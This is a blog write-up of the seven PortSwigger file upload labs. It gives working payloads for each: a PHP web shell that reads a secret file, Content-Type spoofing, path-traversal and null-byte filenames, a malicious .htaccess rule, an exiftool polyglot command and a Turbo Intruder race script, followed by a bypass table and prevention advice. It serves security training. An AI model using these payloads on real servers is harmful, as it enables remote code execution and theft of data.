---
title: "PortSwigger File Upload Labs — Complete Walkthrough"
date: 2026-09-22 06:50:00 +0000
categories: [Web Penetration Testing]
tags: [File Upload, PortSwigger, Web Security Academy, RCE]
description: "All 7 PortSwigger file upload vulnerability labs: web shell upload, Content-Type bypass, path traversal, extension blacklist bypass, null byte, polyglot and race condition."
author: Paschal Sangawe
toc: true
---

File upload vulnerabilities occur when an application lets a user upload a file and then either executes it, trusts its metadata, or stores it somewhere web-accessible without proper validation. If a server-side script (`.php`, `.jsp`, `.asp`) can be uploaded and requested, the impact is usually **remote code execution (RCE)** and full server compromise.

This post walks through all **7 PortSwigger File Upload labs**, in order, with the exact payloads and the reasoning behind each bypass. A companion post covers [Path Traversal / file inclusion](/posts/portswigger-path-traversal-labs/).

## The universal payload

Every lab in this topic ends with the same goal: get a server-side script running that reads Carlos's secret. The script is always some variation of:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Upload it as `exploit.php`, then request `/files/avatars/exploit.php` (or wherever it landed). If the PHP executes, the secret is printed in the response.

> **Picture goes here (#1).** The uploaded avatar request in Burp and its response containing the secret.
> _Save as_ `images/portswigger-file-upload-labs/1.png` _then replace this block with_ `![The universal payload](/images/portswigger-file-upload-labs/1.png)`_._

## Lab 1 — Remote code execution via web shell upload
> **Picture goes here (#2).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `/home/carlos/secret`.
> _Save as_ `images/portswigger-file-upload-labs/2.png` _then replace this block with_ `![Lab 1 — Remote code execution via web shell upload](/images/portswigger-file-upload-labs/2.png)`_._


**Difficulty:** Apprentice
**Goal:** Upload a PHP web shell and read `/home/carlos/secret`.

The avatar upload accepts any file type and stores it under `/files/avatars/`, with no validation at all.

**Steps**

1. Upload any image and confirm it is fetched with `GET /files/avatars/<your-image>`.
2. Create `exploit.php` with the payload above.
3. Upload it as the avatar — the response confirms success.
4. In Burp Repeater, request `GET /files/avatars/exploit.php`.
5. The server executes the script and returns the secret.

> **Picture goes here (#3).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-file-upload-labs/3.png` _then replace this block with_ `![Lab 1 — Remote code execution via web shell upload](/images/portswigger-file-upload-labs/3.png)`_._

## Lab 2 — Web shell upload via Content-Type restriction bypass
> **Picture goes here (#4).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Type: image/jpeg`.
> _Save as_ `images/portswigger-file-upload-labs/4.png` _then replace this block with_ `![Lab 2 — Web shell upload via Content-Type restriction bypass](/images/portswigger-file-upload-labs/4.png)`_._


**Difficulty:** Apprentice
**Goal:** Bypass a MIME-type check.

The server rejects `.php` uploads unless the part's `Content-Type` is `image/jpeg` or `image/png`. That check looks only at the **client-supplied** `Content-Type`, so we simply lie about it.

**Steps**

1. Find the `POST /my-account/avatar` request in history and send it to Repeater.
2. In the multipart body, change the file part's header:

```http
Content-Type: image/jpeg
```

3. Send — the file is accepted.
4. Request `GET /files/avatars/exploit.php` to execute it.

> **Picture goes here (#5).** The modified multipart request with `Content-Type: image/jpeg` and the PHP body.
> _Save as_ `images/portswigger-file-upload-labs/5.png` _then replace this block with_ `![Lab 2 — Web shell upload via Content-Type restriction bypass](/images/portswigger-file-upload-labs/5.png)`_._

## Lab 3 — Web shell upload via path traversal
> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`.
> _Save as_ `images/portswigger-file-upload-labs/6.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/6.png)`_._


**Difficulty:** Practitioner
**Goal:** Upload outside the avatars directory so the PHP is executed.

Here the server does not block `.php`, but files in `/files/avatars/` are served as **static content** (the PHP is returned as plain text). The fix: use a path traversal in the filename to drop the file one level up, into `/files/`, where PHP executes.

**Steps**

1. Upload `exploit.php` — it is stored and returned as plain text at `/files/avatars/exploit.php`.
2. Send `POST /my-account/avatar` to Repeater and set the filename:

```http
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

3. The response says `avatars/exploit.php` — the traversal was stripped. Bypass by URL-encoding the slash:

```http
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

4. The response now says `avatars/../exploit.php`, i.e. the file landed in `/files/`.
5. Request `GET /files/exploit.php` (or `GET /files/avatars/..%2fexploit.php`) to execute it.

> **Picture goes here (#7).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-file-upload-labs/7.png` _then replace this block with_ `![Lab 3 — Web shell upload via path traversal](/images/portswigger-file-upload-labs/7.png)`_._

## Lab 4 — Web shell upload via extension blacklist bypass
> **Picture goes here (#8).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `AddType application/x-httpd-php .l33t`.
> _Save as_ `images/portswigger-file-upload-labs/8.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/8.png)`_._


**Difficulty:** Practitioner
**Goal:** Bypass a `.php` extension blacklist on an Apache server.

The response headers reveal **Apache** with `mod_php`. Rather than fight the blacklist, we upload a malicious `.htaccess` that tells Apache to execute an arbitrary extension as PHP.

**Steps**

1. Upload a `.htaccess` file (set `Content-Type: text/plain`) containing:

```apache
AddType application/x-httpd-php .l33t
```

2. Upload the shell renamed `exploit.l33t`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. Request `GET /files/avatars/exploit.l33t`. Mod_php now treats `.l33t` as PHP and runs it.

> **Picture goes here (#9).** The `.htaccess` upload followed by the executed `.l33t` shell.
> _Save as_ `images/portswigger-file-upload-labs/9.png` _then replace this block with_ `![Lab 4 — Web shell upload via extension blacklist bypass](/images/portswigger-file-upload-labs/9.png)`_._

## Lab 5 — Web shell upload via obfuscated file extension
> **Picture goes here (#10).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"`.
> _Save as_ `images/portswigger-file-upload-labs/10.png` _then replace this block with_ `![Lab 5 — Web shell upload via obfuscated file extension](/images/portswigger-file-upload-labs/10.png)`_._


**Difficulty:** Practitioner
**Goal:** Bypass a check that only allows JPG/PNG.

The filter validates the trailing extension but is vulnerable to a **null byte**, which truncates the string at the filesystem layer.

**Steps**

1. In `POST /my-account/avatar`, set:

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
```

2. The response reports `exploit.php` was uploaded — the null byte and `.jpg` were stripped by the filesystem.
3. Request `GET /files/avatars/exploit.php` to execute the shell.

> **Note:** This works against older PHP/Java runtime combinations where the null byte is not handled safely. Modern runtimes reject it, which is exactly why understanding *why* it worked matters.

> **Picture goes here (#11).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-file-upload-labs/11.png` _then replace this block with_ `![Lab 5 — Web shell upload via obfuscated file extension](/images/portswigger-file-upload-labs/11.png)`_._

## Lab 6 — Remote code execution via polyglot web shell upload
> **Picture goes here (#12).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'`.
> _Save as_ `images/portswigger-file-upload-labs/12.png` _then replace this block with_ `![Lab 6 — Remote code execution via polyglot web shell upload](/images/portswigger-file-upload-labs/12.png)`_._


**Difficulty:** Practitioner
**Goal:** Defeat content-based validation that actually inspects the image.

This lab fully validates that the upload is a real image, so extension tricks fail. The bypass is a **polyglot**: a valid image that also contains PHP. We hide the payload in the image metadata's `Comment` field and keep the `.php` extension.

**Steps**

1. Use ExifTool to inject the payload into a real JPG and save it as `polyglot.php`:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
```

2. Upload `polyglot.php` (it passes as a valid image).
3. In Burp, find `GET /files/avatars/polyglot.php` and search the binary response for `START` … `END`. The secret sits between them.

> **Picture goes here (#13).** The polyglot response with `START <secret> END` in the image data.
> _Save as_ `images/portswigger-file-upload-labs/13.png` _then replace this block with_ `![Lab 6 — Remote code execution via polyglot web shell upload](/images/portswigger-file-upload-labs/13.png)`_._

## Lab 7 — Web shell upload via race condition
> **Picture goes here (#14).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `def queueRequests(target, wordlists):`.
> _Save as_ `images/portswigger-file-upload-labs/14.png` _then replace this block with_ `![Lab 7 — Web shell upload via race condition](/images/portswigger-file-upload-labs/14.png)`_._


**Difficulty:** Practitioner
**Goal:** Execute the shell in the window before the server deletes it.

The server moves the uploaded file to a web-accessible folder **first** and only runs its virus scan **afterwards** — malicious files are deleted once the scan finishes. Between upload and deletion there is a short window where the shell is live. We exploit that with a race condition.

**Steps**

1. Add the **Turbo Intruder** extension (BApp Store).
2. Right-click the `POST /my-account/avatar` request → *Extensions → Turbo Intruder*.
3. Use the request-gate template:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)

    request1 = '''<YOUR-POST-REQUEST>'''
    request2 = '''<YOUR-GET-REQUEST>'''

    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

4. Replace `<YOUR-POST-REQUEST>` with the full avatar upload containing `exploit.php`, and `<YOUR-GET-REQUEST>` with `GET /files/avatars/exploit.php`.
5. Click **Attack**. Some of the GETs return HTTP 200 with the secret — they hit the file after it was written but before the scanner removed it.

> **Picture goes here (#15).** Turbo Intruder results showing 200 responses containing the secret.
> _Save as_ `images/portswigger-file-upload-labs/15.png` _then replace this block with_ `![Lab 7 — Web shell upload via race condition](/images/portswigger-file-upload-labs/15.png)`_._

## Bypass cheat sheet

| Defence | Bypass |
|---------|--------|
| No validation | Upload `.php` directly |
| `Content-Type` allow-list | Spoof `Content-Type: image/jpeg` |
| Static serving of upload dir | Path traversal in filename (`../`, `..%2f`) |
| `.php` blacklist (Apache + mod_php) | Upload `.htaccess` with `AddType`, use custom extension |
| Extension allow-list (JPG/PNG) | Null byte `exploit.php%00.jpg` |
| Content/image validation | Polyglot (payload in image metadata) |
| Upload-then-scan | Race condition (Turbo Intruder) |

## Prevention

- Generate a safe server-side filename (never trust the client filename or extension).
- Validate file **content** (magic bytes) and re-encode images rather than trusting metadata.
- Store uploads **outside the web root** and serve them through a handler that sets `Content-Disposition: attachment` and a safe `Content-Type`.
- Disable script execution in upload directories (e.g. Apache `php_admin_flag engine off`).
- Apply an allow-list of extensions mapped to a single known-safe type.

Next: [Path Traversal / File Inclusion labs](/posts/portswigger-path-traversal-labs/).
